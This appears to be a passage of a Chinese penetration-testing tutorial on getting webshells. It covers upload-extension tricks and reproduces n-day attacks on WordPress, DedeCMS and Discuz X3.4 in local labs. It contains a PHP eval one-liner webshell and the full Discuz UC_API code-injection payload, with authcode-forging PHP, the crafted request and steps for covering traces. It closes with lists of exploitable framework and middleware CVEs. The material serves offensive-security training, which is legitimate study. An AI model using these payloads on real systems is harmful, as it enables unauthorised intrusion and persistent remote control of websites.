+<p><img src="https://img-blog.csdnimg.cn/img_convert/774c51a9d66dab15c0e1f0b225270579.png#clientId=u8bd905b2-5677-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=693&id=u850c81e4&name=image.png&originHeight=1040&originWidth=1542&originalType=binary&ratio=1&rotation=0&showTitle=false&size=238940&status=done&style=none&taskId=u7fda8711-17f1-447f-a7b7-3eff8f46cab&title=&width=1028" alt="image.png"></p>
+<h3 id="4、修改允许上传的后缀"><a href="#4、修改允许上传的后缀" class="headerlink" title="4、修改允许上传的后缀"></a>4、修改允许上传的后缀</h3><p>这类手法getshell , 一般也是存在网站的后台功能点 , 一般在上传设置菜单中 , 然后手动新增一个php后缀即可<br>但是需要注意一点 , <strong>有的时候这个功能是假的 , 即使你新增了 , 还是不让你上传php的后缀文件</strong><br><strong>实战中遇到偏多</strong><br><img src="https://img-blog.csdnimg.cn/img_convert/017c07eabf13debc7177e0b321a49c84.png#crop=0&crop=0&crop=1&crop=1&id=l7ofm&originHeight=950&originWidth=1951&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<h2 id="三、nday"><a href="#三、nday" class="headerlink" title="三、nday"></a>三、nday</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nday 往往是实战中快速getshell的方法 , 如果给你一个网站你能识别他是什么cms 或者 框架 , 中间件 , 组件等</span><br><span class="line">那么直接google搜 , 名称getshell , 然后根据文档一步一步的打 , 如果识别不出来 , 那只能从其他方式getshell了</span><br><span class="line"></span><br><span class="line">如 : 帝国cms getshell</span><br></pre></td></tr></table></figure>
+<h3 id="1、cms的nday"><a href="#1、cms的nday" class="headerlink" title="1、cms的nday"></a>1、cms的nday</h3><p><strong>wordpress</strong></p>
+<ol>
+<li><p>wordpress 介绍 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WordPress是一个以PHP和MySQL为平台的自由开源的博客软件和 内容管理系统 。</span><br><span class="line"></span><br><span class="line">WordPress具有插件架构和模板系统。截至2018年4月，排名前1000万的网站中超过30.6%使用WordPress。WordPress是最受欢迎的网站内容管理系统。全球有大约30%的网站(7亿5000个)都是使用WordPress架设网站的。WordPress是目前因特网上最流行的博客系统。WordPress在最著名的网络发布阶段中脱颖而出。如今，它被使用在超过7000万个站点上。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>wordpress 漏洞</p>
+</li>
+</ol>
+<ul>
+<li>wordpress后台修改模板拿webshell</li>
+<li>wordpress上传主题拿webshell</li>
+</ul>
+<p><strong>wordpress上传主题拿webshell复现</strong><br>环境搭建</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master/wordpress/pwnscriptum</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>漏洞复现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">把带有后门的文件加入到主题里，压缩为zip文件，上传后，程序会自动解压后，主题目录下会存在一个后门文件。</span><br></pre></td></tr></table></figure>
+<p>wordpress主题免费下载站</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://cn.wordpress.org/themes/browse/new/</span><br></pre></td></tr></table></figure>
+<p>然后把webshell直接放到压缩包中<br><img src="https://img-blog.csdnimg.cn/img_convert/cd856bf0c2cf6271f4cbda31894618fc.png#crop=0&crop=0&crop=1&crop=1&id=yh9YU&originHeight=955&originWidth=1696&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br>上传主题</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.156:8080/wp-admin/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6dc5e82a7373a8ec5a07d53673af804a.png#clientId=u8bd905b2-5677-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=415&id=u5e8875b9&name=image.png&originHeight=622&originWidth=1245&originalType=binary&ratio=1&rotation=0&showTitle=false&size=67183&status=done&style=none&taskId=uc97f754e-ce09-431f-8e70-5531f772cf4&title=&width=830" alt="image.png"></p>
+<p>上传成功后，我们可以通过访问&#x2F;wp-content&#x2F;themes&#x2F;[主题名]&#x2F;[一句话木马文件名]通过蚁剑我们成功可以成功连接上去。<br><img src="https://img-blog.csdnimg.cn/img_convert/897d0bd470e9680c1936a75858b288de.png#crop=0&crop=0&crop=1&crop=1&id=lXyZf&originHeight=1182&originWidth=2265&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.156:8080/wp-content/themes/cosmobit/yjh.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/247a98c2479b8888b9f548d9c13247f3.png#clientId=u8bd905b2-5677-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=693&id=ud1793960&name=image.png&originHeight=1040&originWidth=1542&originalType=binary&ratio=1&rotation=0&showTitle=false&size=245982&status=done&style=none&taskId=u56bb4df4-5fb7-4493-b07c-ba8da63fee3&title=&width=1028" alt="image.png"><br><strong>dedecms</strong></p>
+<ol>
+<li><p>dedecms介绍 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DedeCMS是织梦团队开发PHP 网站管理系统，它以简单、易用、高效为特色，组建出各种各样各具特色的网站，如地方门户、行业门户、政府及企事业站点等</span><br></pre></td></tr></table></figure>
+
+</li>
+<li><p>dedecms 漏洞</p>
+</li>
+</ol>
+<ul>
+<li>后台广告管理命令执行</li>
+<li>后台任意文件上传</li>
+<li>后台修改模块文件拿webshell</li>
+</ul>
+<p><strong>后台任意文件上传复现</strong><br>环境搭建</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用上面搭建好的dedecms即可</span><br></pre></td></tr></table></figure>
+<p>进入后台</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dede.com/dede/</span><br></pre></td></tr></table></figure>
+<p>通过文件式管理器 , 上传<br><img src="https://img-blog.csdnimg.cn/img_convert/eaefa957f9ca6381e5182e06a20c6744.png#clientId=u8bd905b2-5677-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=667&id=u60908042&name=image.png&originHeight=1000&originWidth=1646&originalType=binary&ratio=1&rotation=0&showTitle=false&size=145447&status=done&style=none&taskId=u1acf3b4d-b2fc-45e2-badc-1eb28dbd46a&title=&width=1097.3333333333333" alt="image.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/a293a0332b0966235dfe76288651cef7.png#clientId=u8bd905b2-5677-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=691&id=u0c0e919f&name=image.png&originHeight=1037&originWidth=1493&originalType=binary&ratio=1&rotation=0&showTitle=false&size=156984&status=done&style=none&taskId=u90a62fd1-77c0-49f2-a083-c3615755fbf&title=&width=995.3333333333334" alt="image.png"><br>上传之后的默认木马路径为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://dede.com/uploads/yjh.php</span><br><span class="line">yjh</span><br></pre></td></tr></table></figure>
+<p>使用蚁剑链接<br><img src="https://img-blog.csdnimg.cn/img_convert/348388deb3c7e161635aa7520883c416.png#clientId=u8bd905b2-5677-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=696&id=ud487a866&name=image.png&originHeight=1044&originWidth=1545&originalType=binary&ratio=1&rotation=0&showTitle=false&size=156643&status=done&style=none&taskId=u61a439c5-7503-4080-8c2b-a490908aa09&title=&width=1030" alt="image.png"><br><strong>后台修改模块文件拿webshell</strong><br>环境搭建</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同样使用该环境</span><br></pre></td></tr></table></figure>
+<p>修改模板<br><img src="https://img-blog.csdnimg.cn/img_convert/86d1042de8a9752677a5a503cadabc33.png#clientId=u8bd905b2-5677-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=732&id=uabf62d73&name=image.png&originHeight=1098&originWidth=1345&originalType=binary&ratio=1&rotation=0&showTitle=false&size=215460&status=done&style=none&taskId=ubd6c7e8c-3392-42e3-8060-75d69b3828e&title=&width=896.6666666666666" alt="image.png"><br>插入一句话</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;yjh&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/3a83d862d7457ae1af8233bd151d081f.png#clientId=u8bd905b2-5677-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=858&id=ub2c3b58d&name=image.png&originHeight=1287&originWidth=1489&originalType=binary&ratio=1&rotation=0&showTitle=false&size=276288&status=done&style=none&taskId=u568052f9-0665-4d16-b88a-64d236b6de3&title=&width=992.6666666666666" alt="image.png"><br>在生成 更新主页文档HTML下，将主页位置修改为index.php，生成静态的，然后更新<br><img src="https://img-blog.csdnimg.cn/img_convert/26bb0e728ea350b6b71a69d976206dd7.png#clientId=u8bd905b2-5677-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=661&id=u8d6324f5&name=image.png&originHeight=991&originWidth=1352&originalType=binary&ratio=1&rotation=0&showTitle=false&size=154595&status=done&style=none&taskId=ua56ecd49-59ba-4f56-8d85-7c14653fb45&title=&width=901.3333333333334" alt="image.png"><br>使用蚁剑链接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://dede.com/index.php</span><br><span class="line">yjh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6691ac652c0297190ce860f600137473.png#clientId=u8bd905b2-5677-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=696&id=u2238a48e&name=image.png&originHeight=1044&originWidth=1545&originalType=binary&ratio=1&rotation=0&showTitle=false&size=223569&status=done&style=none&taskId=ucbaef947-5073-49b9-9b86-e826abe75f5&title=&width=1030" alt="image.png"><br><strong>Discuz!</strong></p>
+<ol>
+<li><p>dz论坛介绍 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dz论坛（简称 dz!）是北京康盛新创科技有限责任公司推出的一套通用的社区论坛软件系统。自2001年6月面世以来，Discuz!已拥有15年以上的应用历史和200多万网站用户案例，是全球成熟度最高、覆盖率最大的论坛软件系统之一。目前最新版本Discuz! X3.2正式版于2015年6月9日发布，首次引入应用中心的开发模式。2010年8月23日，康盛创想与腾讯达成收购协议，成为腾讯的全资子公司。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>dz漏洞</p>
+</li>
+</ol>
+<ul>
+<li>Discuz_X3.4 后台 getshell</li>
+</ul>
+<p><strong>Discuz_X3.4 后台getshell 复现</strong><br>1.环境搭建<br>源码下载</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://tj.mycodes.net/202103/Discuz_X3.4_SC_UTF8_20210320.zip</span><br></pre></td></tr></table></figure>
+<p>使用 phpstudy 搭建网站</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dz.com/install</span><br></pre></td></tr></table></figure>
+<p>2.漏洞复现<br>访问后台地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://dz.com/admin.php</span><br><span class="line"></span><br><span class="line">admin</span><br><span class="line">admin123</span><br></pre></td></tr></table></figure>
+<p>登录 , 访问 <code>站长</code>-<code>UCenter设置</code>，修改<code>UCenter通信密钥</code>为<code>123456</code>并记录下来 , 同时修改</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">UC_API</span><br><span class="line">http://192.168.15.106/uc_server&#x27;);eval($_POST[sven]);//</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;);eval($_POST[sven]);//</span><br><span class="line"></span><br><span class="line">http://dz.com/uc_server</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/89f7a267f8dd90c294fa605c4a2d8ffd.png#clientId=u8bd905b2-5677-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=639&id=u1e16fe6d&name=image.png&originHeight=958&originWidth=834&originalType=binary&ratio=1&rotation=0&showTitle=false&size=119417&status=done&style=none&taskId=u334916cf-4466-449c-96fa-dd2750521f2&title=&width=556" alt="image.png"><br>点击提交</p>
+<p>生成code参数的值(code.php代码如下)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$uc_key</span>=<span class="string">&quot;123456&quot;</span>;<span class="comment">//此处填写刚才UCenter设置的值</span></span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">time</span>() + <span class="number">720000</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;time=&quot;</span>.<span class="variable">$time</span>.<span class="string">&quot;&amp;action=updateapps&quot;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">authcode</span>(<span class="variable">$str</span>,<span class="string">&quot;ENCODE&quot;</span>,<span class="variable">$uc_key</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;%2b&#x27;</span>,<span class="variable">$code</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;%2f&#x27;</span>,<span class="variable">$code</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">authcode</span>(<span class="params"><span class="variable">$string</span>, <span class="variable">$operation</span> = <span class="string">&#x27;DECODE&#x27;</span>, <span class="variable">$key</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$expiry</span> = <span class="number">0</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$ckey_length</span> = <span class="number">4</span>;</span><br><span class="line">  <span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$key</span> != <span class="string">&#x27;&#x27;</span> ? <span class="variable">$key</span> : <span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line">  <span class="variable">$keya</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$key</span>, <span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">  <span class="variable">$keyb</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$key</span>, <span class="number">16</span>, <span class="number">16</span>));</span><br><span class="line">  <span class="variable">$keyc</span> = <span class="variable">$ckey_length</span> ? (<span class="variable">$operation</span> == <span class="string">&#x27;DECODE&#x27;</span> ? <span class="title function_ invoke__">substr</span>(<span class="variable">$string</span>, <span class="number">0</span>, <span class="variable">$ckey_length</span>): <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">microtime</span>()), -<span class="variable">$ckey_length</span>)) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$cryptkey</span> = <span class="variable">$keya</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$keya</span>.<span class="variable">$keyc</span>);</span><br><span class="line">  <span class="variable">$key_length</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$cryptkey</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$string</span> = <span class="variable">$operation</span> == <span class="string">&#x27;DECODE&#x27;</span> ? <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$string</span>, <span class="variable">$ckey_length</span>)) : <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%010d&#x27;</span>, <span class="variable">$expiry</span> ? <span class="variable">$expiry</span> + <span class="title function_ invoke__">time</span>() : <span class="number">0</span>).<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$string</span>.<span class="variable">$keyb</span>), <span class="number">0</span>, <span class="number">16</span>).<span class="variable">$string</span>;</span><br><span class="line">  <span class="variable">$string_length</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="variable">$box</span> = <span class="title function_ invoke__">range</span>(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$rndkey</span> = <span class="keyword">array</span>();</span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt;= <span class="number">255</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$rndkey</span>[<span class="variable">$i</span>] = <span class="title function_ invoke__">ord</span>(<span class="variable">$cryptkey</span>[<span class="variable">$i</span> % <span class="variable">$key_length</span>]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$j</span> = (<span class="variable">$j</span> + <span class="variable">$box</span>[<span class="variable">$i</span>] + <span class="variable">$rndkey</span>[<span class="variable">$i</span>]) % <span class="number">256</span>;</span><br><span class="line">    <span class="variable">$tmp</span> = <span class="variable">$box</span>[<span class="variable">$i</span>];</span><br><span class="line">    <span class="variable">$box</span>[<span class="variable">$i</span>] = <span class="variable">$box</span>[<span class="variable">$j</span>];</span><br><span class="line">    <span class="variable">$box</span>[<span class="variable">$j</span>] = <span class="variable">$tmp</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$a</span> = <span class="variable">$j</span> = <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$string_length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$a</span> = (<span class="variable">$a</span> + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    <span class="variable">$j</span> = (<span class="variable">$j</span> + <span class="variable">$box</span>[<span class="variable">$a</span>]) % <span class="number">256</span>;</span><br><span class="line">    <span class="variable">$tmp</span> = <span class="variable">$box</span>[<span class="variable">$a</span>];</span><br><span class="line">    <span class="variable">$box</span>[<span class="variable">$a</span>] = <span class="variable">$box</span>[<span class="variable">$j</span>];</span><br><span class="line">    <span class="variable">$box</span>[<span class="variable">$j</span>] = <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="variable">$result</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$string</span>[<span class="variable">$i</span>]) ^ (<span class="variable">$box</span>[(<span class="variable">$box</span>[<span class="variable">$a</span>] + <span class="variable">$box</span>[<span class="variable">$j</span>]) % <span class="number">256</span>]));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$operation</span> == <span class="string">&#x27;DECODE&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>((<span class="title function_ invoke__">substr</span>(<span class="variable">$result</span>, <span class="number">0</span>, <span class="number">10</span>) == <span class="number">0</span> || <span class="title function_ invoke__">substr</span>(<span class="variable">$result</span>, <span class="number">0</span>, <span class="number">10</span>) - <span class="title function_ invoke__">time</span>() &gt; <span class="number">0</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$result</span>, <span class="number">10</span>, <span class="number">16</span>) == <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$result</span>, <span class="number">26</span>).<span class="variable">$keyb</span>), <span class="number">0</span>, <span class="number">16</span>)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$result</span>, <span class="number">26</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$keyc</span>.<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$result</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>php代码在线运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.dooccn.com/php/</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/dd6bbdf71ed7871db126ff47a5179c46.png#clientId=u8bd905b2-5677-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=517&id=u4c01c4ab&name=image.png&originHeight=775&originWidth=1829&originalType=binary&ratio=1&rotation=0&showTitle=false&size=116353&status=done&style=none&taskId=uf2009323-6ee4-4e94-885c-8c5933bd92a&title=&width=1219.3333333333333" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a770%2bezwtH70pSRnAPKKDHWjSt58XdflLRBpD9NGf9Zmrr8QZOG2rGbhLVi6uk3C80NiMvRRxUK%2bEbCiM90</span><br></pre></td></tr></table></figure>
+<p>带code参数GET发送请求 , 请求地址如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dz.com/api/uc.php?code=a770%2bezwtH70pSRnAPKKDHWjSt58XdflLRBpD9NGf9Zmrr8QZOG2rGbhLVi6uk3C80NiMvRRxUK%2bEbCiM90</span><br></pre></td></tr></table></figure>
+<p>抓包测试 , 虽然是get请求 , 但是请求体有<code>xml代码</code> , 用来取消转义的</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">item</span> <span class="attr">id</span>=<span class="string">&quot;UC_API&quot;</span>&gt;</span>http://192.168.15.106/uc_server<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/3bd0203bff451806af026feef241e456.png#clientId=u8bd905b2-5677-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=617&id=u394309c1&name=image.png&originHeight=925&originWidth=1373&originalType=binary&ratio=1&rotation=0&showTitle=false&size=54636&status=done&style=none&taskId=ue5b4e9d5-2cc1-465d-9664-aa9cceb9b04&title=&width=915.3333333333334" alt="image.png"><br>此时 <code>http://127.0.0.1/config/config_ucenter.php</code>就是我们的shell地址<br>使用蚁剑链接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dz.com/config/config_ucenter.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/25b6b754e8050d1ad05d0a4c1e5f10db.png#clientId=u8bd905b2-5677-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=696&id=u53d8b5c9&name=image.png&originHeight=1044&originWidth=1545&originalType=binary&ratio=1&rotation=0&showTitle=false&size=142131&status=done&style=none&taskId=u8fd5192a-24ee-4a84-a793-bcebfa8894b&title=&width=1030" alt="image.png"><br>3.数据恢复<br>主要恢复两个值</p>
+<ul>
+<li>UC_KEY</li>
+<li>config_ucenter.php 文件中插入的木马  文件时间<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">从数据库中读取authkey(uc_server)，通过UC_MYKEY解密获得UC_KEY(dz)，当然也有可能authkey(uc_server)就是UC_KEY(dz)。</span><br><span class="line"></span><br><span class="line">直接进入Ucenter后台修改UC_KEY，修改成我们GetWebShell过程中所设置的值(123456)。或者进入Ucenter后台看到UC_KEY , 保存 , 然后进入后台再修改回来 , 前提是留好其他的马</span><br><span class="line">或者直接在 config/config_ucenter.php 修改文件 UC_KEY的值</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://dz.com/uc_server/admin.php</span><br><span class="line"></span><br><span class="line">密码</span><br><span class="line">admin123</span><br></pre></td></tr></table></figure>
+<img src="https://img-blog.csdnimg.cn/img_convert/abb74a961b9b1a2a428d2e26cc13d471.png#clientId=u8bd905b2-5677-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=480&id=u3c269f7f&name=image.png&originHeight=720&originWidth=2512&originalType=binary&ratio=1&rotation=0&showTitle=false&size=154767&status=done&style=none&taskId=u07e4527a-f87b-4cf0-9571-5dc0c71041b&title=&width=1674.6666666666667" alt="image.png"></li>
+</ul>
+<h3 id="2、框架的nday"><a href="#2、框架的nday" class="headerlink" title="2、框架的nday"></a>2、框架的nday</h3><ol>
+<li>thinkPHP 漏洞 <ul>
+<li>远程代码执行</li>
+</ul>
+</li>
+<li>strust2 漏洞 <ul>
+<li>远程代码执行 s2-057 s2-062</li>
+</ul>
+</li>
+<li>spring 漏洞 <ul>
+<li>远程代码执行  spel表达式</li>
+<li>CVE-2022-22963  rce</li>
+</ul>
+</li>
+<li>等等</li>
+</ol>
+<h3 id="3、中间件的nday"><a href="#3、中间件的nday" class="headerlink" title="3、中间件的nday"></a>3、中间件的nday</h3><ol>
+<li>tomcat 漏洞 <ul>
+<li>put 任意文件上传</li>
+<li>后台部署war包</li>
+<li>CVE-2019-0232  远程代码执行</li>
+<li>CVE-2020-1938   文件包含</li>
+</ul>
+</li>
+<li>weblogic 漏洞 <ul>
+<li>后台部署war包</li>
+<li>CVE-2017-3506  xmldecode 反序列化 rce</li>
+<li>CVE-2018-2628  T3协议 反序列 rce</li>
+<li>…..</li>
+</ul>
+</li>
+<li>jboss 漏洞  , 这三个也都可以后台部署war包 , getshell <ul>
+<li>后台部署war包</li>
+<li>…..</li>
+</ul>
+</li>
+<li>shiro 漏洞 <ul>
+<li>反序列化 rce , key</li>
+</ul>
+</li>
+<li>等等 ….</li>
+</ol>
+<h3 id="4、web服务器的nday"><a href="#4、web服务器的nday" class="headerlink" title="4、web服务器的nday"></a>4、web服务器的nday</h3><ol>
+<li>apache 漏洞 <ul>
